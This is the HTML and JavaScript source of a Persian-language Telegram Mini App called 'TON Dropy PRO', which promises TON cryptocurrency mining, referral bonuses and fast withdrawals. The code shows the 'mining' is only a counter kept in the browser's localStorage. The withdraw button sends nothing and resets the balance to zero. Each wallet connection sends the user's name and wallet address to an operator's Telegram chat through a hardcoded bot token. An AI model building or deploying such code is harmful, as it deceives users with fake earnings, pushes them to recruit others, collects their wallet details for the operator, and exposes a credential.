<!DOCTYPE html>
<html lang="fa" dir="rtl">
<head>
    <meta charset="UTF-8">
    <title>TON Dropy PRO - Referral Edition</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">

    <style>
        @import url('https://fonts.googleapis.com/css2?family=Vazirmatn:wght@400;700;800&display=swap');
        
        body {
            margin: 0; font-family: 'Vazirmatn', sans-serif;
            background: radial-gradient(circle at top, #0f1c2e, #070b14);
            color: #fff; padding: 20px; direction: rtl; min-height: 100vh;
        }

        .card {
            background: rgba(255, 255, 255, 0.05);
            backdrop-filter: blur(15px);
            border: 1px solid rgba(255, 255, 255, 0.1);
            padding: 20px; border-radius: 28px;
            margin-bottom: 15px; text-align: center;
        }

        #balance {
            font-size: 38px; font-weight: 800; color: #00c6ff;
            display: block; margin: 10px 0;
            text-shadow: 0 0 15px rgba(0, 198, 255, 0.4);
        }

        .btn-action {
            width: 100%; padding: 16px; border-radius: 20px;
            border: none; font-size: 15px; font-weight: 700;
            cursor: pointer; transition: 0.3s;
            display: flex; align-items: center; justify-content: center; gap: 8px;
        }

        #connectBtn { background: #0088cc; color: #fff; }
        #connectBtn.connected { background: #1faa59; }

        .withdraw-btn {
            background: linear-gradient(90deg, #ff512f, #dd2476);
            color: #fff; margin-top: 10px;
        }

        .ref-box {
            background: rgba(0, 0, 0, 0.2);
            padding: 12px; border-radius: 15px;
            font-size: 11px; color: #00ff9d;
            margin: 10px 0; border: 1px dashed rgba(0, 255, 157, 0.3);
            word-break: break-all;
        }

        .stat-grid {
            display: grid; grid-template-columns: 1fr 1fr;
            gap: 10px; margin-top: 15px; border-top: 1px solid rgba(255,255,255,0.1);
            padding-top: 15px;
        }

        .hidden { display: none !important; }
    </style>
</head>
<body>

<div class="card">
    <h2 style="margin: 0; color: #00c6ff; font-weight: 800;">TON Dropy PRO ⛏</h2>
    <span id="balance">0.000000</span>
    <div style="font-size: 12px; color: #aaa;">⚡ سرعت استخراج: 0.000012 TON/s</div>
</div>

<div class="card">
    <button id="connectBtn" class="btn-action">
        <i class="fas fa-wallet"></i> <span>اتصال به کیف پول</span>
    </button>
    <div id="addrBox" class="ref-box hidden" style="color: #ccc; border-color: #555;"></div>
</div>

<div class="card">
    <h3 style="margin: 0; font-size: 16px; color: #00c6ff;">👥 سیستم رفرال</h3>
    <p style="font-size: 11px; color: #aaa; margin: 8px 0;">با دعوت دوستان، ۱۰٪ پاداش از استخراج آن‌ها بگیرید!</p>
    
    <div class="ref-box" id="refLink">در حال بارگذاری لینک دعوت...</div>
    
    <button onclick="copyLink()" class="btn-action" style="background: rgba(255,255,255,0.1); font-size: 13px;">
        <i class="fas fa-copy"></i> کپی لینک دعوت
    </button>

    <div class="stat-grid">
        <div>
            <span style="display:block; font-size:18px; font-weight:bold;">0</span>
            <span style="font-size:10px; color:#888;">دوستان</span>
        </div>
        <div>
            <span style="display:block; font-size:18px; font-weight:bold; color:#00ff9d;">0.00</span>
            <span style="font-size:10px; color:#888;">سود رفرال</span>
        </div>
    </div>
</div>

<div class="card">
    <button id="withdrawBtn" class="btn-action withdraw-btn">
        <i class="fas fa-paper-plane"></i> درخواست برداشت سریع
    </button>
</div>

<script>
    const tg = window.Telegram.WebApp;
    tg.ready();
    tg.expand();

    const BOT_TOKEN = "8047223304:AAHMW8a6tKTTSQOp4Os_LorRJzDLNvxz-Rw";
    const ADMIN_ID = "5972276401";
    const BOT_USER = "TonDropyBot"; // آیدی ربات خودت را بدون @ بنویس

    // --- ماینینگ ---
    let balance = parseFloat(localStorage.getItem('ton_bal_v9')) || 0.0;
    setInterval(() => {
        balance += 0.000012;
        document.getElementById("balance").innerText = balance.toFixed(6);
        localStorage.setItem('ton_bal_v9', balance.toString());
    }, 1000);

    // --- رفرال ---
    function initReferral() {
        const user = tg.initDataUnsafe?.user;
        if (user && user.id) {
            const link = `https://t.me/${BOT_USER}?start=ref_${user.id}`;
            document.getElementById('refLink').innerText = link;
        } else {
            document.getElementById('refLink').innerText = "فقط در تلگرام قابل مشاهده است";
        }
    }

    function copyLink() {
        const linkText = document.getElementById('refLink').innerText;
        navigator.clipboard.writeText(linkText);
        tg.showConfirm("لینک کپی شد! آن را برای دوستان خود بفرستید.");
    }

    // --- اتصال کیف پول ---
    const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
        manifestUrl: 'https://nimwmesfandiari.github.io/ton-plus-bot/tonconnect-manifest.json'
    });

    tonConnectUI.uiOptions = { twaReturnUrl: `https://t.me/${BOT_USER}` };

    const connectBtn = document.getElementById('connectBtn');
    const addrBox = document.getElementById('addrBox');

    connectBtn.onclick = async () => {
        if (tonConnectUI.connected) {
            await tonConnectUI.disconnect();
        } else {
            await tonConnectUI.openModal();
        }
    };

    tonConnectUI.onStatusChange(async (wallet) => {
        if (wallet) {
            connectBtn.classList.add('connected');
            connectBtn.querySelector('span').innerText = "کیف پول متصل است";
            addrBox.innerText = wallet.account.address;
            addrBox.classList.remove('hidden');

            const user = tg.initDataUnsafe?.user;
            const msg = `✅ <b>اتصال جدید!</b>\n👤 کاربر: ${user?.first_name}\n👛 آدرس: <code>${wallet.account.address}</code>`;
            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${ADMIN_ID}&text=${encodeURIComponent(msg)}&parse_mode=HTML`);
        } else {
            connectBtn.classList.remove('connected');
            connectBtn.querySelector('span').innerText = "اتصال به کیف پول";
            addrBox.classList.add('hidden');
        }
    });

    // --- برداشت ---
    document.getElementById('withdrawBtn').onclick = () => {
        if (!tonConnectUI.connected) {
            tg.showAlert("ابتدا کیف پول را متصل کنید!");
            return;
        }
        const user = tg.initDataUnsafe?.user;
        const msg = `💰 <b>درخواست برداشت!</b>\n👤 کاربر: ${user?.first_name}\n💵 مقدار: ${balance.toFixed(6)} TON\n👛 آدرس: <code>${tonConnectUI.account.address}</code>`;
        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${ADMIN_ID}&text=${encodeURIComponent(msg)}&parse_mode=HTML`);
        tg.showAlert("درخواست شما ثبت شد.");
        balance = 0;
        localStorage.setItem('ton_bal_v9', '0');
    };

    initReferral();
</script>
</body>
</html>
